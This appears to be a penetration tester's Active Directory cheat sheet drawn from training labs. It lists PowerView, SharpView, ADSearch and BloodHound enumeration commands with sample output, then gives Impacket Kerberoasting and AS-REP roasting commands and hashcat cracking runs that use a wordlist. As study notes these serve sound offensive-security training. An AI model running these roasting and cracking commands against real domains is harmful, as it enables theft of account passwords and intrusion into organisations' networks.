- [[#Enummeration|Enummeration]]
	- [[#Enummeration#PowerView|PowerView]]
		- [[#PowerView#Get-Domain|Get-Domain]]
		- [[#PowerView#Get-DomainController|Get-DomainController]]
		- [[#PowerView#Get-ForestDomain|Get-ForestDomain]]
		- [[#PowerView#Get-DomainPolicyData|Get-DomainPolicyData]]
		- [[#PowerView#Get-DomainUser|Get-DomainUser]]
		- [[#PowerView#Get-DomainComputer|Get-DomainComputer]]
		- [[#PowerView#Get-DomainOU|Get-DomainOU]]
		- [[#PowerView#Get-DomainGroup|Get-DomainGroup]]
		- [[#PowerView#Get-DomainGroupMember|Get-DomainGroupMember]]
		- [[#PowerView#Get-DomainGPO|Get-DomainGPO]]
		- [[#PowerView#Get-DomainGPOLocalGroup|Get-DomainGPOLocalGroup]]
		- [[#PowerView#Get-DomainGPOUserLocalGroupMapping|Get-DomainGPOUserLocalGroupMapping]]
		- [[#PowerView#Get-DomainTrust|Get-DomainTrust]]
	- [[#Enummeration#SharpView|SharpView]]
	- [[#Enummeration#ADSearch|ADSearch]]
	- [[#Enummeration#Bloodhound|Bloodhound]]
	- [[#Enummeration#Import-ActiveDirectory|Import-ActiveDirectory]]
- [[#Kerberos|Kerberos]]
	- [[#Kerberos#Kerberoasting|Kerberoasting]]
		- [[#Kerberoasting#Impacket|Impacket]]
	- [[#Kerberos#AS-Rep Roasting|AS-Rep Roasting]]

## Enummeration

### PowerView

[PowerView](https://github.com/PowerShellMafia/PowerSploit) has long been the de-facto tool for domain enumeration.  One of its biggest strengths is that the queries return proper PowerShell objects, which can be piped to other cmdlets.  This allows you to chain multiple commands together to form complex and powerful queries.

```powershell
Import-Module .\PowerView.ps1
```

#### Get-Domain

Returns a domain object for the current domain or the domain specified with `-Domain`

```powershell
Get-Domain
```
#### Get-DomainController

```powershell
Get-DomainController | select Forest, Name, OSVersion | fl
```
#### Get-ForestDomain

Returns all domains for the current forest or the forest specified by `-Forest`

```powershell
Get-ForestDomain
```
#### Get-DomainPolicyData

```powershell
Get-DomainPolicyData | select -expand SystemAccess
```
#### Get-DomainUser

Return all (or specific) user(s). To only return specific properties, use `-Properties`. By default, all user objects for the current domain are returned, use `-Identity` to return a specific user.

```powershell
Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl
```
#### Get-DomainComputer

```powershell
Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
```
#### Get-DomainOU

```powershell
Get-DomainOU -Properties Name | sort -Property Name
```
#### Get-DomainGroup

```powershell
Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
```
#### Get-DomainGroupMember

```powershell
Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
```
#### Get-DomainGPO

Return all Group Policy Objects (GPOs) or specific GPO objects. To enumerate all GPOs that are applied to a particular machine, use `-ComputerIdentity`.

```powershell
Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
```
#### Get-DomainGPOLocalGroup

Returns all GPOs that modify local group membership through Restricted Groups or Group Policy Preferences.  You can then manually find which OUs, and by extension which computers, these GPOs apply to.

```powershell
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName

GPODisplayName     GroupName            
--------------     ---------            
Workstation Admins DEV\Support Engineers
Server Admins      DEV\Support Engineers
```

  *This shows that the Support Engineers group is being assigned some sort of local access to the machines to which these GPOs apply.  Although the GPO naming convention suggests this is local admin access, it may also be a different localgroup such as Remote Desktop Users.*

#### Get-DomainGPOUserLocalGroupMapping

Enumerates the machines where a specific domain user/group is a member of a specific local group.  This is useful for finding where domain groups have local admin access, which is a more automated way to perform the manual cross-referencing described above.

```powershell
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl

ObjectName     : Support Engineers
GPODisplayName : Server Admins
ContainerName  : {OU=Servers,DC=dev,DC=cyberbotic,DC=io}
ComputerName   : {web.dev.cyberbotic.io, sql-2.dev.cyberbotic.io, fs.dev.cyberbotic.io}

ObjectName     : Support Engineers
GPODisplayName : Workstation Admins
ContainerName  : {OU=Workstations,DC=dev,DC=cyberbotic,DC=io}
ComputerName   : {wkstn-1.dev.cyberbotic.io, wkstn-2.dev.cyberbotic.io}
```

*This output confirms that the Support Engineers domain group is a member of the local Administrators group on machines: web, sql-2, fs, wkstn-1 and wkstn-2.*

#### Get-DomainTrust

```powershell
Get-DomainTrust
```

### SharpView

[SharpView](https://github.com/tevora-threat/SharpView) was designed to be a C# port of PowerView and therefore has much the same functionality.  However, one downside is that it doesn't have the same piping ability as PowerShell.

```cmd
C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
```

### ADSearch

[ADSearch](https://github.com/tomcarver16/ADSearch) has fewer built-in searches compared to PowerView and SharpView, but it does allow you to specify custom Lightweight Directory Access Protocol (LDAP) searches.  These can be used to identify entries in the directory that match a given criteria.

For example, we can search for all objects whose category is "user" (i.e. domain users).

```cmd
C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user"

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 

[*] TOTAL NUMBER OF SEARCH RESULTS: 10
	[+] cn : Administrator
	[+] cn : Guest
	[+] cn : krbtgt
	[+] cn : CYBER$
	[+] cn : Bob Farmer
	[+] cn : John King
	[+] cn : Nina Lamb
	[+] cn : MS SQL Service
	[+] cn : Squid Proxy
	[+] cn : STUDIO$
```

These can be made more complex with further AND, OR and NOT conditions.  All attributes can be returned using the `--full` parameter, or specific attributes with the `--attributes` parameter.

```cmd
C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member

[*] TOTAL NUMBER OF SEARCH RESULTS: 1
	[+] cn     : MS SQL Admins
	[+] member : CN=Developers,CN=Users,DC=dev,DC=cyberbotic,DC=io
```

### Bloodhound

Injector: Sharphound

```powershell
Import-Module .\Sharphound.ps1
Get-Help Invoke-BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```

### Import-ActiveDirectory

Deleted Objects
```powershell
Get-ADObject -SearchBase "CN=Deleted Objects, DC=Contoso, DC=Com" -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *

Restore-AdObject -Identity ""
```

## Kerberos

### Kerberoasting

#### Impacket

```bash
GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete:password
```

```powershell
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


### AS-Rep Roasting

```bash
GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete:password
```

```powershell
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```